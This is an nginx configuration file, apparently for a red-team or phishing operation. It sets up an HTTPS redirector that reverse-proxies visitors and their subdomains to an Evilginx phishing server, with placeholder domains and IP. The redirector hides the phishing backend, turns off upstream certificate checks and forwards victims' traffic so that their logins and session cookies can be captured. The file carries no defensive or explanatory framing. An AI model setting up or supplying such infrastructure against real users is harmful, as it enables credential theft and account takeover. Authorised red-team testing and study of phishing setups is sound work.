server {
    listen 80;
    server_name <redirector-domain.com> *.<redirector-domain.com>;
    
    # Redirect HTTP to HTTPS
    return 301 https://$host:8443$request_uri;
}

server {
    listen 8443 ssl;
    server_name <redirector-domain.com> *.<redirector-domain.com>;
    
    # SSL certificate settings
    ssl_certificate /etc/letsencrypt/live/<redirector-domain.com>/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/<redirector-domain.com>/privkey.pem;
    
    # Improved SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;
    
    # DNS resolver for hostname resolution
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;
    
    # Enable debug logging
    error_log /var/log/nginx/redirector-error.log debug;
    
    # Extract the subdomain from the incoming request
    set $subdomain "";
    if ($host ~ "^([^.]+)\.redirector-domain\.com$") {
        set $subdomain $1;
    }
    
    # For the root domain, use a default subdomain from evilginx
    if ($subdomain = "") {
        set $target_host "<Evilginx_Ext_IP>";
    }
    
    location / {
        # Set up dynamic proxy pass
        proxy_pass https://EXT-IP:443;
        
        # If we have a subdomain, use it to determine the evilginx Host header
        # This makes a direct mapping between redirector and evilginx subdomains
        set $target_host "";
        
        if ($subdomain != "") {
            # For subdomains - map directly
            set $target_host "$subdomain.EG-Domain.com";
        }
        
        if ($subdomain = "") {
            # For root domain - you can modify this default behavior
            # Just pass the original host header when accessed via root domain
            set $target_host "EG-Domain.com";
        }
        
        proxy_set_header Host $target_host;
        
        # SSL proxy settings
        proxy_ssl_verify off;
        proxy_ssl_server_name on;
        proxy_ssl_protocols TLSv1.2 TLSv1.3;
        
        # Important headers
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
        
        # Timeout settings
        proxy_connect_timeout 60s;
        proxy_read_timeout 60s;
        proxy_send_timeout 60s;
        
        # Buffer settings
        proxy_buffer_size 16k;
        proxy_buffers 4 16k;
    }
}